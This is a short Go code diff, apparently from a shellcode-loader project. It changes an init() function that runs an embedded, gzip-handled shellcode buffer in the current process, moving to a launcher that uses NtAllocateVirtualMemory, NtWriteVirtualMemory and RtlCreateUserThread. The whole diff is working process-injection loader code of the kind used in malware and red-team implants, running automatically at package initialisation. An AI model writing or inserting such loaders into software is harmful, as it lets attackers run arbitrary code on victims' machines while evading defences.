@@ -14,6 +14,7 @@ import (
 func init() {
 	var e error
 	var g *gzip.Reader
+	var l *runsc.Launcher = runsc.New()
 
 	// Return if no shellcode
 	if len(sc) == 0 {
@@ -31,9 +32,10 @@ func init() {
 	}
 
 	// Launch shellcode into current process using
-	// NtAllocateVirtualMemory. See github.com/mjwhitta/runsc for
-	// other methods.
-	if e = runsc.WithNtAllocateVirtualMemory(0, sc); e != nil {
+	// NtAllocateVirtualMemory, NtWriteVirtualMemory, and
+	// RtlCreateUserThread. See github.com/mjwhitta/runsc for other
+	// configuration methods.
+	if e = l.Exe(sc); e != nil {
 		return
 	}
 }
